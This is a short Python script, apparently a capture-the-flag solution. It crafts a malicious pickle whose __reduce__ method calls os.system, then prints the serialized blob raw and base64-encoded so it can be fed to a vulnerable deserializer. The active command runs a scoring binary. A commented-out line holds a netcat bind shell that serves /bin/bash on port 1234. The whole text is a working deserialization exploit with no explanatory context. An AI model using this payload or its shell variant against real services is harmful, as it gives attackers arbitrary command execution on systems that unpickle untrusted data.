import pickle, base64, os

class blah(object):
    def __reduce__(self):
        #return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
        return (os.system,("/usr/local/bin/score 8f68822f-f1c9-4f4f-997a-84b80ba769d9",))

revs = blah()
prevs = pickle.dumps(revs)

print(prevs)


brevs = base64.b64encode(prevs)
print(brevs)


